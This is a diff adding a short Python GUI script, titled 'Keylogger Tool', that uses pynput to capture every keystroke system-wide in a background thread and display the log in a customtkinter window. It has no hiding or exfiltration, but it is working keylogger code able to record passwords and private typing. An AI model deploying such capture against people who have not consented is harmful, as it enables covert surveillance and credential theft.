@@ -1,0 +1,40 @@
+#!/usr/bin/env python
+
+import customtkinter as ctk
+from pynput import keyboard
+import threading
+
+log = ""
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        log += f"[{key}]"
+
+    textbox.delete("0.0", "end")
+    textbox.insert("0.0", log)
+
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+def run_keylogger():
+    thread = threading.Thread(target=start_keylogger)
+    thread.daemon = True
+    thread.start()
+
+# GUI
+ctk.set_appearance_mode("dark")
+app = ctk.CTk()
+app.title("Keylogger Tool")
+app.geometry("500x400")
+
+btn = ctk.CTkButton(app, text="Start Keylogger", command=run_keylogger)
+btn.pack(pady=10)
+
+textbox = ctk.CTkTextbox(app, width=450, height=300)
+textbox.pack(pady=10)
+
+app.mainloop()
